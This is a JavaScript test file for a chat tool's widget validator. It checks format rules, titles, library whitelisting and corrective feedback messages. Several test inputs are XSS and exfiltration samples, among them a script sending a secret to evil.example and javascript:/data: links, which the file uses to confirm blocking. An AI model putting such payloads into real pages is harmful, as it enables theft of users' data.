#!/usr/bin/env node
/**
 * show_widget 的纯逻辑：入参校验 + 两条回执文案（src/harness/widget.ts）。
 *
 * 为什么只测这一层：真正决定「预检有没有意义」的是**它是否走了渲染层同一个净化函数**，
 * 那是 `probe-svg-sanitize.mjs`（要真浏览器，DOMPurify 需要 window）守的。
 * 本文件守住剩下的一半：参数校验，以及**回执文案是否可执行** ——
 * 文案是模型唯一的纠错依据，写成「已阻止渲染」这种它没法照着改的话，
 * 这个工具就退化成一块只会说「不行」的牌子。
 *
 * 运行：node scripts/test-course-chat-tools.mjs 之外单独跑：node scripts/test-widget.mjs
 */
import assert from 'node:assert/strict';
import { validateWidgetArgs, widgetAcceptedText, widgetRejectedText } from '../src/harness/widget.ts';
import { fenceTitleOf, MAX_FENCE_TITLE } from '../src/components/mermaid/fence.ts';

let passed = 0;
const failures = [];
function test(name, fn) {
  try {
    fn();
    passed++;
    console.log(`  ok - ${name}`);
  } catch (e) {
    failures.push({ name, e });
    console.log(`  FAIL - ${name}\n    ${e.message}`);
  }
}

const SVG = '<svg viewBox="0 0 240 120"><rect x="1" y="1" width="10" height="10"/></svg>';
const PLOT_JSON = '{"type":"plot","x":[-3,3],"y":[-1,5],"curves":[{"fn":"x^2","label":"y=x²"}]}';

test('接受 svg / mermaid / diagram 三种 format', () => {
  const cases = [
    ['svg', SVG],
    ['mermaid', 'flowchart TD\n  A-->B'],
    ['diagram', PLOT_JSON],
  ];
  for (const [format, code] of cases) {
    const v = validateWidgetArgs({ format, code });
    assert.ok(v.ok, `${format} 应通过`);
    assert.equal(v.args.format, format);
    assert.equal(v.args.code, code, 'code 应被 trim 后原样保留');
  }
});

// ── html 形态：mockup / interactive / chart 都走它 ────────────────────────────
test('html 形态：接受片段，libs 白名单外的被拒', () => {
  const ok = validateWidgetArgs({ format: 'html', code: '<div id="c">hi</div>' });
  assert.ok(ok.ok);
  assert.equal(ok.args.libs, undefined, '没传 libs 就不该有该字段');

  const withLib = validateWidgetArgs({ format: 'html', code: '<canvas></canvas>', libs: ['chart.js'] });
  assert.ok(withLib.ok);
  assert.deepEqual(withLib.args.libs, ['chart.js']);

  // 重复声明去重，避免把 200KB 的库内联两遍
  const dup = validateWidgetArgs({ format: 'html', code: '<b/>', libs: ['chart.js', 'chart.js'] });
  assert.deepEqual(dup.args.libs, ['chart.js']);

  const bad = validateWidgetArgs({ format: 'html', code: '<b/>', libs: ['https://evil.example/x.js'] });
  assert.ok(!bad.ok && /libs/.test(bad.error), '任意外链不得被当作库内联');
});

test('html 形态：拒绝文档外壳（外壳由宿主提供）', () => {
  for (const code of [
    '<html><body>x</body></html>',
    '<!DOCTYPE html><p>x</p>',
    '<head><style>a{}</style></head>',
    '<body>x</body>',
    '</body>',
    '</html>',
  ]) {
    const v = validateWidgetArgs({ format: 'html', code });
    assert.ok(!v.ok, `应拒绝：${code}`);
    assert.match(v.error, /片段/);
  }
});

test('html 形态：拒绝外链脚本与外链资源（网络已禁用，要给可执行的解释）', () => {
  const s = validateWidgetArgs({ format: 'html', code: '<script src="https://cdn.example/x.js"></script>' });
  assert.ok(!s.ok && /libs/.test(s.error), '要提示改用 libs，而不是只说「不行」');

  const h = validateWidgetArgs({ format: 'html', code: '<img src="https://evil.example/x.png">' });
  assert.ok(!h.ok && /外部/.test(h.error));

  const l = validateWidgetArgs({ format: 'html', code: '<link href="https://evil.example/x.css" rel="stylesheet">' });
  assert.ok(!l.ok && /外部/.test(l.error));

  for (const code of [
    '<img src=//evil.example/x.png>',
    '<img src=https://evil.example/x.png>',
    '<a href=//evil.example/>跳转</a>',
    '<a href="javascript:alert(1)">执行</a>',
    '<a href="data:text/html,<script>alert(1)</script>">执行</a>',
  ]) {
    const v = validateWidgetArgs({ format: 'html', code });
    assert.ok(!v.ok && /外部|javascript|data|导航/.test(v.error), `危险资源/导航应拒绝：${code}`);
  }
  assert.equal(validateWidgetArgs({ format: 'html', code: '<a href="#step-2">页内</a>' }).ok, true);
  for (const code of [
    '<script>location.href = "https://evil.example/?x=" + secret</script>',
    '<script>window.open("https://evil.example")</script>',
    '<script>globalThis["location"] = "https://evil.example"</script>',
  ]) {
    const v = validateWidgetArgs({ format: 'html', code });
    assert.ok(!v.ok && /导航|外部/.test(v.error), `脚本导航应拒绝：${code}`);
  }
});

test('html 形态：超长被拒；内联 script 不误伤', () => {
  const v = validateWidgetArgs({ format: 'html', code: 'x'.repeat(60_001) });
  assert.ok(!v.ok && /60000/.test(v.error));
  const ok = validateWidgetArgs({ format: 'html', code: "<div></div><script>var a=1</scr" + 'ipt>' });
  assert.ok(ok.ok, '内联 script 应放行');
});

test('html 回执：给出正文位置引用，不重复源码或宣称在下方', () => {
  const t = widgetAcceptedText({ format: 'html', code: '<div/>' }, 'host-ref');
  assert.match(t, /预检通过/);
  assert.match(t, /不要贴 HTML 源码/);
  assert.ok(t.includes('```wbw-widget\nhost-ref\n```'));
  assert.ok(!t.includes('<div/>') && !t.includes('下方'));
});

test('拒绝非法 format / 空 code / 超长 code', () => {
  const bad1 = validateWidgetArgs({ format: 'dot', code: SVG });
  assert.ok(!bad1.ok && /format/.test(bad1.error));

  const bad2 = validateWidgetArgs({ format: 'svg', code: '   ' });
  assert.ok(!bad2.ok && /不能为空/.test(bad2.error));

  const bad3 = validateWidgetArgs({ format: 'svg', code: 'x'.repeat(20_001) });
  assert.ok(!bad3.ok && /过长/.test(bad3.error));

  // 参数整个缺失也不能抛
  assert.ok(!validateWidgetArgs(undefined).ok);
  assert.ok(!validateWidgetArgs(null).ok);
  assert.ok(!validateWidgetArgs({}).ok);
});

test('code 恰好在上限上不报错（边界）', () => {
  assert.ok(validateWidgetArgs({ format: 'svg', code: 'x'.repeat(20_000) }).ok);
});

test('通过回执：回一段围栏，并强调「还没上屏」与「放进正文」', () => {
  const t = widgetAcceptedText({ format: 'svg', code: SVG });
  // 模型最容易犯的错是把回执当成「已经画完了」而不写进正文，所以这两句是硬要求
  assert.match(t, /还没有上屏/);
  assert.match(t, /放进你的回答正文/);
  assert.ok(t.includes('```svg'), '回执里必须含可粘贴的围栏');
  assert.ok(t.includes(SVG), '源码要原样带回来');
});

test('通过回执：mermaid 与 diagram 的围栏名跟着 format 走', () => {
  const t = widgetAcceptedText({ format: 'mermaid', code: 'flowchart TD\n  A-->B' });
  assert.ok(t.includes('```mermaid'));
  assert.ok(!t.includes('```svg'));
  // diagram 回**原样 JSON**：围栏的内容就是 JSON 本身（tools.ts 的 diagram 分支）
  const d = widgetAcceptedText({ format: 'diagram', code: PLOT_JSON });
  assert.ok(d.includes('```diagram'));
  assert.ok(d.includes(PLOT_JSON), '回执里必须带回那段 JSON（模型照抄进正文）');
  assert.ok(!d.includes('```svg'));
});

// ── 标题：模型是照着回执「原样贴进正文」的，回执不带标题，标题就在这一趟里丢掉了 ──
test('title：三种围栏都收，空标题按没写处理', () => {
  for (const format of ['svg', 'mermaid', 'diagram']) {
    const v = validateWidgetArgs({ format, code: SVG, title: '三次握手' });
    assert.ok(v.ok, `${format} 应通过`);
    assert.equal(v.args.title, '三次握手');
  }
  // 空 / 只有空白 / 没传 → 字段不存在，回执也就不写 title=
  for (const title of [undefined, '', '   ']) {
    const v = validateWidgetArgs({ format: 'svg', code: SVG, title });
    assert.ok(v.ok);
    assert.equal(v.args.title, undefined);
    assert.ok(!widgetAcceptedText(v.args).includes('title='), '空标题不该写出 title=');
  }
});

test('title：control 字符压成空格、首尾空白去掉', () => {
  const v = validateWidgetArgs({ format: 'svg', code: SVG, title: '  三次\n握手  ' });
  assert.ok(v.ok);
  assert.equal(v.args.title, '三次 握手');
});

test('title：超长要拒并说清「标题不是正文句子」，而不是像渲染层那样截断', () => {
  const long = '函'.repeat(MAX_FENCE_TITLE + 1);
  const v = validateWidgetArgs({ format: 'diagram', code: PLOT_JSON, title: long });
  assert.ok(!v.ok);
  assert.match(v.error, /title 过长/);
  assert.match(v.error, /不要把正文句子塞进来/, '要说清该怎么改，不能只说不行');
  assert.ok(validateWidgetArgs({ format: 'diagram', code: PLOT_JSON, title: '函'.repeat(MAX_FENCE_TITLE) }).ok, '恰好在上限上应通过');
});

test('title：非字符串被拒；两种引号同时出现被拒（围栏参数按引号解析）', () => {
  assert.ok(!validateWidgetArgs({ format: 'svg', code: SVG, title: 42 }).ok);
  const v = validateWidgetArgs({ format: 'svg', code: SVG, title: '他说"就\'这样"' });
  assert.ok(!v.ok);
  assert.match(v.error, /引号/);
  // 只有一种引号是安全的：换另一种引号包住即可
  assert.ok(validateWidgetArgs({ format: 'svg', code: SVG, title: '他说"就这样"' }).ok);
});

test('title：html 形态没有标题栏，传了要拒（不静默丢掉）', () => {
  const v = validateWidgetArgs({ format: 'html', code: '<div></div>', title: '原型' });
  assert.ok(!v.ok);
  assert.match(v.error, /title 只用于/, '要告诉模型该往哪儿写');
  assert.ok(validateWidgetArgs({ format: 'html', code: '<div></div>' }).ok, '不传 title 不受影响');
});

test('通过回执：带 title 时围栏首行写成 ```diagram title="…"', () => {
  const d = widgetAcceptedText({ format: 'diagram', code: PLOT_JSON, title: '抛物线开口方向' });
  assert.ok(d.includes('```diagram title="抛物线开口方向"'), '围栏首行必须带标题');
  assert.ok(d.includes(PLOT_JSON), '源码仍要原样带回来');
  // 标题里有双引号时改用单引号包（fenceTitleOf 两支都认）
  const q = widgetAcceptedText({ format: 'mermaid', code: 'flowchart TD\nA-->B', title: '他说"走"' });
  assert.ok(q.includes("```mermaid title='他说\"走\"'"));
});

test('★ 闭环：预检回执的围栏首行能被 fence.ts 解析回同一个标题', () => {
  // 两端各写各的解析就会出现「预检写了标题、渲染层读不出来」这种静默失败，
  // 所以这里把回执文本真喂给渲染层的解析函数走一遍。
  for (const format of ['svg', 'mermaid', 'diagram']) {
    const code = format === 'diagram' ? PLOT_JSON : format === 'svg' ? SVG : 'flowchart TD\nA-->B';
    const text = widgetAcceptedText({ format, code, title: '三次握手' });
    const header = text.split('\n').find((l) => l.startsWith('```' + format));
    assert.ok(header, `回执里应有 ${format} 围栏首行`);
    assert.equal(fenceTitleOf(header.slice(3)), '三次握手');
  }
  // 不带标题时解析回 null —— 调用方据此退回图种标签
  const plain = widgetAcceptedText({ format: 'svg', code: SVG });
  const h = plain.split('\n').find((l) => l.startsWith('```svg'));
  assert.equal(fenceTitleOf(h.slice(3)), null);
});

test('失败回执：diagram 的每类 schema / 表达式报错都要翻译成可执行的改法', () => {
  // 措辞对齐 diagramSchema.ts / expr.ts 实际会抛的几种（含精确位置）
  const cases = [
    ['表达式第 7 字符附近出错：不认识的函数「sinn」（snippet）', /白名单函数/],
    ['nodes[0]有不认识的字段「colour」。可用字段：id / label / shape（大小写敏感，不要自己发明字段名）', /schema 是锁死的/],
    ['edges[0].to 引用了不存在的节点「z」。可用 id：a / b', /from\/to/],
    ['type 必须是 "graph"（节点+连线的结构图）或 "plot"（函数图像/几何图形/坐标轴），实得 "diagram"。流程/时序/状态/层级这类标准结构图优先用 ```mermaid 围栏', /只能取/],
    ['diagram 围栏里不是合法的 JSON：Unexpected token } in JSON。请检查多余的逗号', /JSON 对象/],
    ['nodes 超过 10 个（实得 11 个）：拆成两张图，或改用列表', /数量上限/],
    ['edges 超过 16 条（实得 17 条）：连线太多说明图该拆', /数量上限/],
    ['edges[0] 是自环（from 与 to 都是「a」）：本渲染器不支持自环，去掉它或把说明写进节点文案', /自环/],
    ['curves[0].domain [-3, 3] 超出了 x 范围 [-5, 5]：曲线只能画在坐标轴范围内', /domain/],
    ['polygons[0].points 至少需要 3 个点（实得 2 个）', /至少 3 个点/],
    ['circles[0].r 必须是正数（实得 -2）', /正数/],
    ['nodes[0].color 只能是 #1677ff 这样的十六进制颜色或少数命名色（实得 "url(#x)"）', /十六进制/],
    ['nodes[0].shape 只能是 box / round / ellipse / diamond（实得 "hexagon"）', /shape 只能是/],
    ['labels[0].anchor 只能是 start / middle / end（实得 "center"）', /anchor 只能是/],
    ['direction 只能是 "TB"（纵向）或 "LR"（横向），实得 "RL"', /direction 只能/],
  ];
  for (const [raw, expect] of cases) {
    const t = widgetRejectedText(new Error(raw));
    assert.match(t, expect, `原始报错「${raw}」的归因不对`);
    assert.ok(t.includes(raw), '必须带上原始报错，否则模型无从定位');
    assert.match(t, /图不会上屏/, '要说清后果');
  }
});

test('失败回执：diagram 的 type 报错不被 mermaid 分支截胡（归因顺序）', () => {
  // type 报错文案里含着「```mermaid」字样：diagram 分支必须整体排在 svg/mermaid 之前，
  // 否则这条会被末尾的 mermaid 分支接走，给出「换 flowchart」这种文不对题的改法。
  const t = widgetRejectedText(new Error('type 必须是 "graph" 或 "plot"，实得 "diagram"'));
  assert.match(t, /type 只能取/);
  assert.ok(!/mermaid 语法或图种不被支持/.test(t), '不该落到 mermaid 的改法上');
});

test('失败回执：每类净化报错都要翻译成可执行的改法', () => {
  // 措辞对齐 components/mermaid/svgRender.ts 实际会抛的几种
  const cases = [
    ['没有找到 <svg 标签：请用 ```svg 围栏包一段完整的 SVG', /以 <svg 开头/],
    ['SVG 没有闭合（缺少 </svg>）', /补上 <\/svg>/],
    ['净化后没有剩下可渲染的图形内容', /白名单之外的标签/],
    ['SVG 包含脚本或外部嵌入内容，已阻止渲染', /含有脚本或外部嵌入/],
    ['SVG 引用了外部资源，已阻止渲染', /不允许引用外部资源/],
  ];
  for (const [raw, expect] of cases) {
    const t = widgetRejectedText(new Error(raw));
    assert.match(t, expect, `原始报错「${raw}」的归因不对`);
    assert.ok(t.includes(raw), '必须带上原始报错，否则模型无从定位');
    assert.match(t, /图不会上屏/, '要说清后果');
  }
});

test('失败回执：认不出来的报错回落到通用建议，不丢原文', () => {
  const t = widgetRejectedText(new Error('某个没见过的异常'));
  assert.match(t, /某个没见过的异常/);
  assert.match(t, /定位问题/);
});

test('失败回执：非 Error 的抛出物也能处理', () => {
  assert.match(widgetRejectedText('字符串报错'), /字符串报错/);
  assert.match(widgetRejectedText({ weird: true }), /定位问题/);
});

console.log(`\n${passed} passed, ${failures.length} failed`);
if (failures.length > 0) process.exit(1);
